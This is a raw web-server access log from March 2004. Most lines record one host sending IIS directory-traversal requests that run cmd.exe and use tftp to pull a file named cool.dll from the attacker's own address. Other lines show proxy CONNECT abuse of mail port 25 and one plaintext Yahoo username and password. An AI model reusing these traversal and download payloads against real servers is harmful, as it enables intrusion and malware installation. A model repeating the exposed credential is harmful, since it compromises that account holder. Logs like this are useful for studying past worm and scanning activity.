68.48.142.117 - - [09/Mar/2004:22:40:35 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:40:44 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:29 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:34 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:34 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:37 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:38 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 305 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:41 -0500] "GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:41:42 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:42:19 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:42:19 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:42:35 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:43:12 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:43:25 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
62.58.50.81 - - [09/Mar/2004:22:43:26 -0500] "CONNECT 205.231.29.241:25 HTTP/1.0" 200 - "-" "-"
24.168.72.174 - - [09/Mar/2004:22:43:47 -0500] "GET http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus9971&passwd=christ HTTP/1.0" 200 566 "-" "-"
62.58.50.81 - - [09/Mar/2004:22:43:58 -0500] "POST http://205.231.29.241:25/ HTTP/1.0" 200 85 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:44:03 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:44:17 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:44:53 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
192.117.242.67 - - [09/Mar/2004:22:45:06 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
192.117.242.67 - - [09/Mar/2004:22:45:06 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:45:08 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:45:43 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
203.121.182.189 - - [09/Mar/2004:22:45:56 -0500] "CONNECT 211.22.130.68:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:45:58 -0500] "GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:46:36 -0500] "GET /scripts/..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:46:48 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
61.53.76.40 - - [09/Mar/2004:22:47:17 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 200 21081 "http://www.sanlala.com/index.html" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)"
220.175.18.42 - - [09/Mar/2004:22:47:17 -0500] "GET http://www.samair.ru/proxy/proxychecker/results.htm HTTP/1.0" 200 3931 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)"
220.175.18.42 - - [09/Mar/2004:22:47:19 -0500] "GET http://www.stayinvisible.com/index.pl/ip_test_result_nocache HTTP/1.0" 200 8030 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)"
68.48.142.117 - - [09/Mar/2004:22:47:26 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-"
220.175.18.42 - - [09/Mar/2004:22:47:30 -0500] "GET http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi HTTP/1.0" 200 26166 "http://www.yourwindow.com/searchlikecrazy.htm" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
220.175.18.42 - - [09/Mar/2004:22:47:35 -0500] "GET http://searchlikecrazy.com/cgi-bin/sf.cgi?t=es&keys=zvzssxzazhzasohyzohxhiaxayziznzdsazmayaoaphsshahhhzisksisisfhmsvanaiasassdsnhisnanasahafhdhvzpzyzihoaxamhczpzyzvzazpzxhczzsasfzshizhszamsyhfspszsoaysssszvazfvfmhnhkzczizczvzdadadzn&kw=web+design HTTP/1.0" 302 333 "http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
68.48.142.117 - - [09/Mar/2004:22:47:38 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
220.175.18.42 - - [09/Mar/2004:22:47:40 -0500] "GET http://65.17.208.131/search/search/redirect.php?s=5460953&r=1&l=1 HTTP/1.0" 302 0 "http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
220.175.18.42 - - [09/Mar/2004:22:47:41 -0500] "GET http://www.kanoodle.com/clickthrough.cool?position=7001&tid=bhngbnnobonpbgnkbknpzqrdxbxoyx&bid=0.09&eid=1&id=77810869&query=web%20design&clickid=23442688&UNQ=00107889044985920592&subid=10470 HTTP/1.0" 301 344 "http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
220.175.18.42 - - [09/Mar/2004:22:47:43 -0500] "GET http://order.1and1.com/xml/order/Hosting?ac=OM.US.US431K02123T1785a HTTP/1.0" 302 647 "http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
192.117.242.67 - - [09/Mar/2004:22:47:49 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-"
220.175.18.42 - - [09/Mar/2004:22:47:49 -0500] "GET http://order.1and1.com/xml/order/Hosting;jsessionid=D05DD9B48032ADC5828D6F02C4D2935D.TC62a?ac=OM.US.US431K02123T1785a HTTP/1.0" 200 19093 "http://www.searchlikecrazy.com/cgi-bin/smartsearch.cgi?keywords=Web+Design%20&username=arongyi" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; MyIE2)"
203.121.182.139 - - [09/Mar/2004:22:47:56 -0500] "CONNECT 212.69.119.246:25 HTTP/1.0" 200 - "-" "-"
68.48.142.117 - - [09/Mar/2004:22:48:16 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
217.82.29.57 - - [09/Mar/2004:22:48:19 -0500] "GET http://www.sun.com/ HTTP/1.0" 200 12257 "http://www.heise.de" "Mozilla/4.0 (compatible; ICS)"
217.82.29.57 - - [09/Mar/2004:22:48:23 -0500] "GET http://proxyjudge.org/prxjdg.cgi HTTP/1.0" 200 1218 "-" "Mozilla/4.0 (compatible; ICS)"
217.82.29.57 - - [09/Mar/2004:22:48:27 -0500] "GET http://proxyjudge.org/prxjdg.cgi HTTP/1.0" 200 1218 "-" "Mozilla/4.0 (compatible; ICS)"
68.48.142.117 - - [09/Mar/2004:22:48:28 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
203.121.182.189 - - [09/Mar/2004:22:48:40 -0500] "CONNECT 61.172.201.173:25 HTTP/1.0" 200 - "-" "-"
62.195.43.15 - - [09/Mar/2004:22:49:05 -0500] "GET http://62.195.43.15/members/sex/fuck/id000057id/lund2676lundxxx.html HTTP/1.0" 401 0 "-" "-"
68.48.142.117 - - [09/Mar/2004:22:49:09 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-"
203.121.182.141 - - [09/Mar/2004:22:49:12 -0500] "CONNECT 207.137.186.92:25 HTTP/1.0" 500 434 "-" "-"
